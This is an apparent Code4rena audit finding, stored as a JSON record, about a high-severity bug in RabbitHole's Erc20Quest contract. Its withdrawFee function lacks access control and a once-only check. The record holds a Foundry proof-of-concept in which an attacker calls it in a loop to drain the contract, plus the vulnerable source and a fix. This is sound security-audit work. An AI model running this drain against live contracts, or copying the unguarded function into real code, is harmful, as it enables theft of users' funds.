{
  "Title": "[H-02] Protocol fees can be withdrawn multiple times in Erc20Quest",
  "Content": "# Lines of code\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104\n\n\n# Vulnerability details\n\nThe `withdrawFee` function present in the `Erc20Quest` contract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104\n\n```solidity\nfunction withdrawFee() public onlyAdminWithdrawAfterEnd {\n    IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n}\n```\n\nThis function doesn't provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.\n\n## Impact\n\nThe `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven't claimed their rewards yet) and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.\n\nNote also that the `onlyAdminWithdrawAfterEnd` modifier, even though it indicates that an \"admin\" should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:\n\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79\n\n```solidity\nmodifier onlyAdminWithdrawAfterEnd() {\n    if (block.timestamp < endTime) revert NoWithdrawDuringClaim();\n    _;\n}\n```\n\nThis means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.\n\n## PoC\n\nIn the following demonstration, the `withdrawFee` function is called multiple times by a bad actor to remove all tokens from the quest contract.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n\n    function signReceipt(address account, string memory questId)\n        internal\n        view\n        returns (bytes32 hash, bytes memory signature)\n    {\n        hash = keccak256(abi.encodePacked(account, questId));\n        bytes32 message = ECDSA.toEthSignedMessageHash(hash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);\n        signature = abi.encodePacked(r, s, v);\n    }\n\n    function claimReceipt(address account, string memory questId) internal {\n        (bytes32 hash, bytes memory signature) = signReceipt(account, questId);\n        vm.prank(account);\n        factory.mintReceipt(questId, hash, signature);\n    }\n    \n    function test_Erc20Quest_ProtocolFeeWithdrawMultipleTimes() public {\n        address alice = makeAddr(\"alice\");\n        address attacker = makeAddr(\"attacker\");\n\n        uint256 startTime = block.timestamp + 1 hours;\n        uint256 endTime = startTime + 1 hours;\n        uint256 totalParticipants = 1;\n        uint256 rewardAmountOrTokenId = 1 ether;\n        string memory questId = \"a quest\";\n\n        // create, fund and start quest\n        vm.startPrank(deployer);\n\n        Erc20Quest quest = Erc20Quest(\n            factory.createQuest(\n                address(token),\n                endTime,\n                startTime,\n                totalParticipants,\n                rewardAmountOrTokenId,\n                \"erc20\",\n                questId\n            )\n        );\n\n        uint256 rewards = totalParticipants * rewardAmountOrTokenId;\n        uint256 fees = (rewards * factory.questFee()) / 10_000;\n        deal(address(token), address(quest), rewards + fees);\n        quest.start();\n\n        vm.stopPrank();\n\n        // simulate at least one user claims a receipt\n        claimReceipt(alice, questId);\n\n        // simulate time elapses until the end of the quest\n        vm.warp(endTime);\n\n        // The following can be executed by attacker (griefer) or by the fee recipient\n        vm.startPrank(attacker);\n\n        uint256 protocolFee = quest.protocolFee();\n        uint256 withdrawCalls = (rewards + fees) / protocolFee;\n\n        for (uint256 i = 0; i < withdrawCalls; i++) {\n            quest.withdrawFee();\n        }\n\n        // Fee recipient has 100% of the funds\n        assertEq(token.balanceOf(protocolFeeRecipient), rewards + fees);\n        assertEq(token.balanceOf(address(quest)), 0);\n\n        vm.stopPrank();\n    }\n}\n```\n\n## Recommendation\n\nAdd a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2023-01-rabbithole-quest-protocol-contest",
  "Code": [
    {
      "filename": "contracts/Erc20Quest.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {Quest} from './Quest.sol';\nimport {QuestFactory} from './QuestFactory.sol';\n\n/// @title Erc20Quest\n/// @author RabbitHole.gg\n/// @notice This contract is used to create a quest that rewards ERC20 tokens.\ncontract Erc20Quest is Quest {\n    using SafeERC20 for IERC20;\n    uint256 public immutable questFee;\n    address public immutable protocolFeeRecipient;\n    QuestFactory public immutable questFactoryContract;\n\n    constructor(\n        address rewardTokenAddress_,\n        uint256 endTime_,\n        uint256 startTime_,\n        uint256 totalParticipants_,\n        uint256 rewardAmountInWeiOrTokenId_,\n        string memory questId_,\n        address receiptContractAddress_,\n        uint256 questFee_,\n        address protocolFeeRecipient_\n    )\n        Quest(\n            rewardTokenAddress_,\n            endTime_,\n            startTime_,\n            totalParticipants_,\n            rewardAmountInWeiOrTokenId_,\n            questId_,\n            receiptContractAddress_\n        )\n    {\n        questFee = questFee_;\n        protocolFeeRecipient = protocolFeeRecipient_;\n        questFactoryContract = QuestFactory(msg.sender);\n    }\n\n    /// @dev Function that gets the maximum amount of rewards that can be claimed by all users. It does not include the protocol fee\n    /// @return The maximum amount of rewards that can be claimed by all users\n    function maxTotalRewards() public view returns (uint256) {\n        return totalParticipants * rewardAmountInWeiOrTokenId;\n    }\n\n    /// @notice Function that gets the maximum amount of rewards that can be claimed by the protocol or the quest deployer\n    /// @dev The 10_000 comes from Basis Points: https://www.investopedia.com/terms/b/basispoint.asp\n    /// @return The maximum amount of rewards that can be claimed by the protocol or the quest deployer\n    function maxProtocolReward() public view returns (uint256) {\n        return (maxTotalRewards() * questFee) / 10_000;\n    }\n\n    /// @notice Starts the quest by marking it ready to start at the contract level. Marking a quest ready to start does not mean that it is live. It also requires that the start time has passed\n    /// @dev Requires that the balance of the rewards in the contract is greater than or equal to the maximum amount of rewards that can be claimed by all users and the protocol\n    function start() public override {\n        if (IERC20(rewardToken).balanceOf(address(this)) < maxTotalRewards() + maxProtocolReward())\n            revert TotalAmountExceedsBalance();\n        super.start();\n    }\n\n    /// @notice Internal function that transfers the rewards to the msg.sender\n    /// @param amount_ The amount of rewards to transfer\n    function _transferRewards(uint256 amount_) internal override {\n        IERC20(rewardToken).safeTransfer(msg.sender, amount_);\n    }\n\n    /// @notice Internal function that calculates the reward amount\n    /// @dev It is possible for users to have multiple receipts (if they buy others on secondary markets)\n    /// @param redeemableTokenCount_ The amount of tokens that can be redeemed\n    /// @return The total amount of rewards that can be claimed by a user\n    function _calculateRewards(uint256 redeemableTokenCount_) internal view override returns (uint256) {\n        return redeemableTokenCount_ * rewardAmountInWeiOrTokenId;\n    }\n\n    /// @notice Function that allows the owner to withdraw the remaining tokens in the contract\n    /// @dev Every receipt minted should still be able to claim rewards (and cannot be withdrawn). This function can only be called after the quest end time\n    /// @param to_ The address to send the remaining tokens to\n    function withdrawRemainingTokens(address to_) public override onlyOwner {\n        super.withdrawRemainingTokens(to_);\n\n        uint unclaimedTokens = (receiptRedeemers() - redeemedTokens) * rewardAmountInWeiOrTokenId;\n        uint256 nonClaimableTokens = IERC20(rewardToken).balanceOf(address(this)) - protocolFee() - unclaimedTokens;\n        IERC20(rewardToken).safeTransfer(to_, nonClaimableTokens);\n    }\n\n    /// @notice Call the QuestFactory contract to get the amount of receipts that have been minted\n    /// @return The amount of receipts that have been minted for the given quest\n    function receiptRedeemers() public view returns (uint256) {\n        return questFactoryContract.getNumberMinted(questId);\n    }\n\n    /// @notice Function that calculates the protocol fee\n    function protocolFee() public view returns (uint256) {\n        return (receiptRedeemers() * rewardAmountInWeiOrTokenId * questFee) / 10_000;\n    }\n\n    /// @notice Sends the protocol fee to the protocolFeeRecipient\n    /// @dev Only callable when the quest is ended\n    function withdrawFee() public onlyAdminWithdrawAfterEnd {\n        IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n    }\n}"
    }
  ]
}